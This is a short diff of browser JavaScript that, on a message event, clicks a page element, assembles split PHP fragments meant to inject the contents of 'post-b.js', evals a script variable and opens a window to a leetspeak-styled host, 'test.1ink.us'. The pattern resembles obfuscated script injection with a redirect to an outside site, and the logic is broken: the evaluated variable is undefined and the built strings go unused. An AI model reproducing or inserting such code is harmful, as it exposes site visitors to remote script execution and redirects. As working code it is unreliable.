@@ -17,8 +17,8 @@ let disp=document.getElementById('display').innerHTML;
 fa.addEventListener('message',e => {
 document.getElementById('strt').
 click();
-var txa = "let scr=<";
-var txb = "?php $scr=file_get_contents("post-b.js");echo"$scr";?>;";
+var txa = 'let scr=<';
+var txb = '?php $scr=file_get_contents("post-b.js");echo "$scr";?>;';
 eval(scr);
 });
 window.open("https://test.1ink.us/f1l3/f1c.php");
